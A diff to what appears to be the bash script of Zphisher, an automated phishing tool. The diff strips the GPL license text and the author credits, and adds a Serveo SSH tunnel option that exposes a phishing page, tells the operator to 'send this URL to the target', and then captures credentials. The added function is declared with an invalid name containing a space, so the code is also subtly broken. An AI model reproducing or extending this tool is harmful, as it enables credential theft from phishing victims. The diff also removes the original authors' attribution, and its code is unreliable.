@@ -1,93 +1,7 @@
 #!/bin/bash
-
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+:
 
 
-##                   GNU GENERAL PUBLIC LICENSE
-##                    Version 3, 29 June 2007
-##
-##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
-##    Everyone is permitted to copy and distribute verbatim copies
-##    of this license document, but changing it is not allowed.
-##
-##                         Preamble
-##
-##    The GNU General Public License is a free, copyleft license for
-##    software and other kinds of works.
-##
-##    The licenses for most software and other practical works are designed
-##    to take away your freedom to share and change the works.  By contrast,
-##    the GNU General Public License is intended to guarantee your freedom to
-##    share and change all versions of a program--to make sure it remains free
-##    software for all its users.  We, the Free Software Foundation, use the
-##    GNU General Public License for most of our software; it applies also to
-##    any other work released this way by its authors.  You can apply it to
-##    your programs, too.
-##
-##    When we speak of free software, we are referring to freedom, not
-##    price.  Our General Public Licenses are designed to make sure that you
-##    have the freedom to distribute copies of free software (and charge for
-##    them if you wish), that you receive source code or can get it if you
-##    want it, that you can change the software or use pieces of it in new
-##    free programs, and that you know you can do these things.
-##
-##    To protect your rights, we need to prevent others from denying you
-##    these rights or asking you to surrender the rights.  Therefore, you have
-##    certain responsibilities if you distribute copies of the software, or if
-##    you modify it: responsibilities to respect the freedom of others.
-##
-##    For example, if you distribute copies of such a program, whether
-##    gratis or for a fee, you must pass on to the recipients the same
-##    freedoms that you received.  You must make sure that they, too, receive
-##    or can get the source code.  And you must show them these terms so they
-##    know their rights.
-##
-##    Developers that use the GNU GPL protect your rights with two steps:
-##    (1) assert copyright on the software, and (2) offer you this License
-##    giving you legal permission to copy, distribute and/or modify it.
-##
-##    For the developers' and authors' protection, the GPL clearly explains
-##    that there is no warranty for this free software.  For both users' and
-##    authors' sake, the GPL requires that modified versions be marked as
-##    changed, so that their problems will not be attributed erroneously to
-##    authors of previous versions.
-##
-##    Some devices are designed to deny users access to install or run
-##    modified versions of the software inside them, although the manufacturer
-##    can do so.  This is fundamentally incompatible with the aim of
-##    protecting users' freedom to change the software.  The systematic
-##    pattern of such abuse occurs in the area of products for individuals to
-##    use, which is precisely where it is most unacceptable.  Therefore, we
-##    have designed this version of the GPL to prohibit the practice for those
-##    products.  If such problems arise substantially in other domains, we
-##    stand ready to extend this provision to those domains in future versions
-##    of the GPL, as needed to protect the freedom of users.
-##
-##    Finally, every program is threatened constantly by software patents.
-##    States should not allow patents to restrict development and use of
-##    software on general-purpose computers, but in those that do, we wish to
-##    avoid the special danger that patents applied to a free program could
-##    make it effectively proprietary.  To prevent this, the GPL assures that
-##    patents cannot be used to render the program non-free.
-##
-##    The precise terms and conditions for copying, distribution and
-##    modification follow.
-##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
-##
-
-##   THANKS TO :
-##   1RaY-1 - https://github.com/1RaY-1
-##   Aditya Shakya - https://github.com/adi1090x
-##   Ali Milani Amin - https://github.com/AliMilani
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Moises Tapia - https://github.com/MoisesTapia
-##   Mr.Derek - https://github.com/E343IO
-##   Mustakim Ahmed - https://github.com/bdhackers009
-##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
 __version__="2.3.5"
@@ -213,7 +127,7 @@ banner() {
 		${ORANGE}      | |                                
 		${ORANGE}      |_|                ${RED}Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		
 	EOF
 }
 
@@ -223,7 +137,7 @@ banner_small() {
 		${BLUE}
 		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
 		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀$
 	EOF
 }
 
@@ -508,6 +422,19 @@ start_loclx() {
 	capture_data
 }
 
+## start serveo
+start serveo() {
+echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing Serveo... ${BLUE}(SSH-based, no install needed)${WHITE}"
+  { sleep 1; setup_site; }
+  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Serveo tunnel on port 80...${WHITE}"
+  ssh -R "80:localhost:${PORT}" serveo.net > .tunnels_log 2>&1 &
+  sleep 10  # Wait for Serveo to initialize
+  SERVEO_URL=$(grep -o "https://[a-z0-9]*\.serveo\.net" .tunnels_log)
+  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL: ${SERVEO_URL}${WHITE}"
+  echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Send this URL to the target.${WHITE}"
+  catch_creds
+}
+
 ## Start localhost
 start_localhost() {
 	cusport
@@ -538,6 +465,7 @@ tunnel_menu() {
 			start_cloudflared;;
 		3 | 03)
 			start_loclx;;
+                4 | 04) start serveo;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
